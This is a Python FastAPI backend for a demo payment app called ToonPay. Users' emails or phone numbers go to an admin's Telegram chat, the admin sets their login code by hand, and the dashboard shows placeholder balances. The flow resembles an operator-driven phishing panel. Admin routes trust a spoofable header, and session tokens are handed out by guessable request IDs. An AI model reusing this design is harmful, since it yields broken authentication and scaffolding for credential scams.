import hashlib
import hmac
import os
import re
import secrets
from pathlib import Path

import httpx
from dotenv import load_dotenv
from fastapi import FastAPI, Header, HTTPException
from fastapi.responses import FileResponse
from pydantic import BaseModel, Field

import database


load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN", "").strip()
ADMIN_ID = int(os.getenv("ADMIN_TELEGRAM_ID", "0"))

BASE_DIR = Path(__file__).resolve().parent
STATIC_DIR = BASE_DIR / "static"

database.init_db()

app = FastAPI(title="ToonPay")


class LoginRequest(BaseModel):
    telegram_id: int
    username: str | None = None
    login_value: str = Field(min_length=3, max_length=160)
    login_method: str


class CodeSubmit(BaseModel):
    request_id: int
    entered_code: str = Field(min_length=6, max_length=6)


def hash_demo_code(code: str) -> str:
    salt = os.getenv("DEMO_CODE_SALT", "toonpay-demo-salt")

    return hashlib.sha256(
        f"{salt}:{code}".encode("utf-8")
    ).hexdigest()


def safe_code_match(entered_code: str, stored_hash: str) -> bool:
    return hmac.compare_digest(
        hash_demo_code(entered_code),
        stored_hash,
    )


async def telegram_message(chat_id: int, text: str, reply_markup=None):
    if not BOT_TOKEN:
        return

    payload = {
        "chat_id": chat_id,
        "text": text,
    }

    if reply_markup:
        payload["reply_markup"] = reply_markup

    async with httpx.AsyncClient(timeout=20) as client:
        response = await client.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json=payload,
        )

        response.raise_for_status()


@app.get("/")
async def home():
    return FileResponse(STATIC_DIR / "index.html")


@app.get("/app.js")
async def javascript():
    return FileResponse(
        STATIC_DIR / "app.js",
        media_type="application/javascript",
    )


@app.get("/style.css")
async def stylesheet():
    return FileResponse(
        STATIC_DIR / "style.css",
        media_type="text/css",
    )


@app.get("/logo.png")
async def logo():
    return FileResponse(STATIC_DIR / "logo.png")


@app.get("/health")
async def health():
    return {
        "status": "ok",
        "service": "toonpay",
    }


@app.post("/api/login/request")
async def request_login(data: LoginRequest):

    if data.login_method not in ("email", "phone"):
        raise HTTPException(
            status_code=400,
            detail="Invalid login method.",
        )

    if data.login_method == "email":
        valid_email = re.fullmatch(
            r"[^@\s]+@[^@\s]+\.[^@\s]+",
            data.login_value,
        )

        if not valid_email:
            raise HTTPException(
                status_code=400,
                detail="Enter a valid email address.",
            )

    if data.login_method == "phone":
        valid_phone = re.fullmatch(
            r"\+?[0-9][0-9\s\-()]{6,24}",
            data.login_value,
        )

        if not valid_phone:
            raise HTTPException(
                status_code=400,
                detail="Enter a valid phone number.",
            )

    request_id = database.create_login_request(
        telegram_id=data.telegram_id,
        username=data.username,
        login_value=data.login_value,
        login_method=data.login_method,
    )

    if ADMIN_ID:
        keyboard = {
            "inline_keyboard": [
                [
                    {
                        "text": "🔐 Set Demo Code",
                        "callback_data": f"setcode:{request_id}",
                    },
                    {
                        "text": "❌ Reject",
                        "callback_data": f"reject:{request_id}",
                    },
                ]
            ]
        }

        await telegram_message(
            ADMIN_ID,
            (
                "🔐 ToonPay Login Request\n\n"
                f"Request: #{request_id}\n"
                f"User: @{data.username or 'user'}\n"
                f"Telegram ID: {data.telegram_id}\n"
                f"Method: {data.login_method.title()}\n"
                f"Login: {data.login_value}\n\n"
                "This is a demo authentication request.\n"
                "Set a synthetic 6-digit demo code for the user."
            ),
            keyboard,
        )

    return {
        "request_id": request_id,
        "status": "waiting_code",
    }


@app.post("/api/login/submit-code")
async def submit_code(data: CodeSubmit):

    if not data.entered_code.isdigit():
        raise HTTPException(
            status_code=400,
            detail="Code must contain numbers only.",
        )

    request = database.get_request(data.request_id)

    if not request:
        raise HTTPException(
            status_code=404,
            detail="Login request not found.",
        )

    if not request["code_configured"]:
        raise HTTPException(
            status_code=409,
            detail="The demo code has not been configured yet.",
        )

    stored_hash = request["demo_code_hash"]

    if not stored_hash:
        raise HTTPException(
            status_code=409,
            detail="The demo code is unavailable.",
        )

    if safe_code_match(data.entered_code, stored_hash):

        database.mark_code_verified(data.request_id)

        return {
            "status": "approved",
        }

    database.mark_code_rejected(data.request_id)

    return {
        "status": "rejected",
    }


@app.get("/api/login/status/{request_id}")
async def login_status(request_id: int):

    request = database.get_request(request_id)

    if not request:
        raise HTTPException(
            status_code=404,
            detail="Request not found.",
        )

    response = {
        "status": request["status"],
    }

    if request["status"] == "approved":

        if not request["session_token"]:
            token = database.create_session(
                request["telegram_id"],
                request["username"],
            )

            database.attach_session(
                request_id,
                token,
            )

            response["session_token"] = token

        else:
            response["session_token"] = request["session_token"]

    return response


@app.post("/internal/admin/set-demo-code/{request_id}")
async def admin_set_demo_code(
    request_id: int,
    code: str,
    x_admin_id: int | None = Header(default=None),
):

    if x_admin_id != ADMIN_ID:
        raise HTTPException(
            status_code=403,
            detail="Admin only.",
        )

    if not re.fullmatch(r"[0-9]{6}", code):
        raise HTTPException(
            status_code=400,
            detail="Demo code must contain exactly 6 digits.",
        )

    request = database.get_request(request_id)

    if not request:
        raise HTTPException(
            status_code=404,
            detail="Request not found.",
        )

    database.set_demo_code(
        request_id,
        hash_demo_code(code),
    )

    return {
        "status": "waiting_user_code",
    }


@app.post("/internal/admin/reject/{request_id}")
async def admin_reject(
    request_id: int,
    x_admin_id: int | None = Header(default=None),
):

    if x_admin_id != ADMIN_ID:
        raise HTTPException(
            status_code=403,
            detail="Admin only.",
        )

    request = database.get_request(request_id)

    if not request:
        raise HTTPException(
            status_code=404,
            detail="Request not found.",
        )

    database.set_status(
        request_id,
        "rejected",
    )

    return {
        "status": "rejected",
    }


@app.get("/api/dashboard")
async def dashboard(
    authorization: str | None = Header(default=None),
):

    if not authorization:
        raise HTTPException(
            status_code=401,
            detail="Missing session.",
        )

    token = authorization.replace(
        "Bearer ",
        "",
    ).strip()

    session = database.get_session(token)

    if not session:
        raise HTTPException(
            status_code=401,
            detail="Invalid session.",
        )

    return {
        "user": {
            "telegram_id": session["telegram_id"],
            "username": session["username"],
        },
        "balance": "0.66",
        "currency": "USD",
        "cashback": "0.00",
        "points": 0,
        "points_target": 100,
        "plan": "Starter",
        "plan_expiry": "Feb 12",
        "notifications": 1,
        "referrals": {
            "count": 0,
            "earned": "0.00",
        },
        "transactions": [
            {
                "title": "Test deposit",
                "amount": "+$10.00",
                "status": "Completed",
            },
            {
                "title": "Test transfer",
                "amount": "-$2.50",
                "status": "Completed",
            },
            {
                "title": "Cashback reward",
                "amount": "+$0.25",
                "status": "Completed",
            },
        ],
    }
